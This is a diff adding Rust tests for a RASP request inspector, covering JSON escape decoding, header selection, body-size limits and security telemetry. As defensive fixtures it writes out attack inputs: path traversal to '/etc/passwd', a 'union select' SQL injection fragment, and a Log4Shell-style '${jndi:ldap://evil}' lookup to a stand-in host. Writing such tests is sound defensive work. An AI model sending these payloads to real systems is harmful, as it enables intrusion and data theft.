@@ -462,3 +462,74 @@ async fn clean_bodies_up_to_the_inspection_limit_are_served() {
         StatusCode::FORBIDDEN
     );
 }
+
+#[test]
+fn json_arrays_are_decoded_before_inspection() {
+    let escaped = r#"{"list":["ok","\u002e\u002e\u002fsecret"]}"#;
+    assert!(!RaspInspector::inspect_text(escaped));
+    assert!(RaspInspector::inspect_body(escaped, "application/json"));
+    assert!(RaspInspector::inspect_body(
+        r#"["\u002e\u002e\u002fsecret"]"#,
+        "application/json"
+    ));
+}
+
+#[test]
+fn credentials_headers_are_not_inspected() {
+    let mut headers = HeaderMap::new();
+    headers.insert(header::COOKIE, HeaderValue::from_static("q=union select"));
+    headers.insert(
+        header::AUTHORIZATION,
+        HeaderValue::from_static("Bearer ../../etc/passwd"),
+    );
+    assert!(!RaspInspector::inspect_headers(&headers));
+    headers.insert(
+        header::REFERER,
+        HeaderValue::from_static("/x?q=union select"),
+    );
+    assert!(RaspInspector::inspect_headers(&headers));
+}
+
+#[tokio::test]
+async fn a_declared_length_above_the_limit_is_refused_before_reading() {
+    let request = |length: usize| {
+        Request::builder()
+            .method("POST")
+            .uri("/echo")
+            .header(header::CONTENT_TYPE, "text/plain")
+            .header(header::CONTENT_LENGTH, length)
+            .body(Body::from("ok"))
+            .unwrap()
+    };
+    let over = guarded_app()
+        .oneshot(request(MAX_INSPECTED_REQUEST_BYTES + 1))
+        .await
+        .unwrap();
+    assert_eq!(over.status(), StatusCode::PAYLOAD_TOO_LARGE);
+    let at_limit = guarded_app()
+        .oneshot(request(MAX_INSPECTED_REQUEST_BYTES))
+        .await
+        .unwrap();
+    assert_ne!(at_limit.status(), StatusCode::PAYLOAD_TOO_LARGE);
+}
+
+#[tokio::test]
+async fn a_rejection_is_recorded_in_security_telemetry() {
+    let request = Request::builder()
+        .uri("/items")
+        .header(header::REFERER, "/x?q=${jndi:ldap://evil}")
+        .body(Body::empty())
+        .unwrap();
+    let response = guarded_app().oneshot(request).await.unwrap();
+    assert_eq!(response.status(), StatusCode::FORBIDDEN);
+    let events = crate::telemetry::SecurityStore::global()
+        .live_events
+        .lock()
+        .unwrap();
+    assert!(events.iter().any(|event| {
+        event.event_type == "RASP_PAYLOAD_INTERCEPTED"
+            && event
+                .details
+                .contains("uri=false, headers=true, body=false")
+    }));
+}
